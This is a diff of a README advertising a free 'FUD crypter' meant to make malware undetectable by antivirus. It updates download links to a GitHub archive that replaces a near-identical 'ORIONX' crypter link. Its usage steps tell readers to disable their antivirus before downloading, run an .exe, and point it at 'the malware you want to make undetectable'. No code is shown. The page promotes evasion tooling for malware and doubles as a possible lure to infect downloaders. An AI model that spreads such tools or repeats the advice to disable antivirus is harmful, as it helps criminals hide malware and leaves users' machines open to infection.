@@ -8,7 +8,7 @@ The only <strong>FREE</strong> and 100% FUD crypter that <strong>WILL STILL FUD<
 <div class="center" align="center"><center><img src="https://github.com/DimitriVolkov1/GHOST-FUD-CRYPTER/blob/main/GHOST%20logo.png" width="120" alt="ghost fud crypter logo"/></center></div>
 <br>
 <div align="center" class="center">
-<center><strong>GHOST FUD CRYPTER <br> <a href=""> DOWNLOAD </a></font></strong></center>
+<center><strong>GHOST FUD CRYPTER <br> <a href="https://github.com/DimitriVolkov1/GHOST-FUD-CRYPTER/archive/refs/heads/main.zip"> DOWNLOAD </a></font></strong></center>
 </div>
 <br>
 <br>
@@ -27,7 +27,7 @@ It was actually made for windows but I will release the source code and modify i
 Usage/Install
 -----
 - Before downloading you will need to disable your Anti-Virus, otherwise it sends your crypted file to the Anti-Virus company
-- Click <a href="https://github.com/hackerOrionX/ORIONX-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
+- Click <a href="https://github.com/DimitriVolkov1/GHOST-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
 - EXTRACT before using otherwise the script will not work correctly
 - Run the .exe 
 - Set the input (The path to the malware you want to make undetectable) and ouput the directory where you want to file to be generated
